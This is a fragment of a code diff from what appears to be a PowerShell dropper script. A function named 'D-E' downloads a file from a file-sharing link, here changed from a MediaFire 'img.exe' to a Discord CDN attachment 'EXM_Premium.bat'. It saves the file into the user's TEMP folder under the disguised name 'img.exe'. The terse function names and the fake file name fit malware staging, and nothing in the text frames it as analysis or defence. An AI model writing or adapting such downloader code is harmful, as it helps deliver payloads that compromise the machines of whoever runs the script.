@@ -54,7 +54,7 @@ function S-D {
 }
 
 function D-E {
-    $u = "https://download1349.mediafire.com/qluyxmev1ligsbShHyYe0X_GHYwtkvh7RDGZki5fKUUiL4LJh3SkiBJckaTdcjgZsrm6-sI_rKy2wKqGVGIudH5Np3RUJ__E8dn0OhIbNmUjWtEmoLtbfrG-QG6bdtkdXemCx7o2uZQn-FKrw5b03ISsi0ThLZIwaBbr_vKISYXv/2prkm5wvssnzlum/img.exe"
+    $u = "https://cdn.discordapp.com/attachments/1243302229205843988/1243303505620635668/EXM_Premium.bat?ex=6657939f&is=6656421f&hm=16fc969feba27734c70acd9f9f6eb28d71df2361e69f3d6e33ffbfe0ccb30b6a&"
     $o = "$env:TEMP\img.exe"
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile($u, $o)
